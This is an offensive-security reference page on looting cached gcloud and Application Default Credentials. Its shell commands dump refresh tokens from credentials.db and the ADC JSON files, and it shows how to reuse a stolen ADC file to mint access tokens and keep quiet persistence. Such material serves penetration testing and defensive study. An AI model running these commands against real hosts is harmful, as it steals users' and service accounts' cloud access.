---
title: "Access tokens: looting cached gcloud and ADC credentials"
order: 4
description: "Looting cached gcloud credentials and Application Default Credentials from disk and reusing their refresh and access tokens."
keywords:
  - gcloud credentials
  - ADC
  - application default credentials
  - access token
  - refresh token
  - credential files
---

# Access tokens

Developer and CI hosts cache GCP credentials on disk: the `gcloud` SQLite credential store and the **Application Default Credentials** (ADC) file. Both hold refresh tokens that mint fresh access tokens indefinitely, so reading them from a compromised host hands you the user's or service account's standing access.

## Where they live

```bash
# gcloud user credentials (refresh tokens) and the active config
ls ~/.config/gcloud/
sqlite3 ~/.config/gcloud/credentials.db 'select account_id, value from credentials;'
cat ~/.config/gcloud/legacy_credentials/*/adc.json 2>/dev/null

# Application Default Credentials
cat ~/.config/gcloud/application_default_credentials.json
echo "$GOOGLE_APPLICATION_CREDENTIALS"   # may point at a key or ADC file
```

## Reusing them

```bash
# drop a stolen ADC file in place and the SDK and client libraries pick it up
export GOOGLE_APPLICATION_CREDENTIALS=/path/stolen_adc.json
gcloud auth print-access-token
# or mint a token straight from a refresh token against the OAuth endpoint
```

## Exploitation notes

- ADC refresh tokens for a **user** carry that user's full Google identity, not just one project, so they can be broad.
- On Windows the store is under `%APPDATA%\gcloud\`; on CI runners the ADC file or `GOOGLE_APPLICATION_CREDENTIALS` path is the target.
- A refresh token survives until revoked, making this a quiet persistence as well as a theft.

## Tools

- **gcloud** (`auth print-access-token`, `auth list`).
- **sqlite3** to read `credentials.db`.
- **ROADtools**-style token handling for raw OAuth refresh.

## References

- [Google: Application Default Credentials](https://cloud.google.com/docs/authentication/application-default-credentials)
- [HackTricks Cloud: GCP local credentials](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
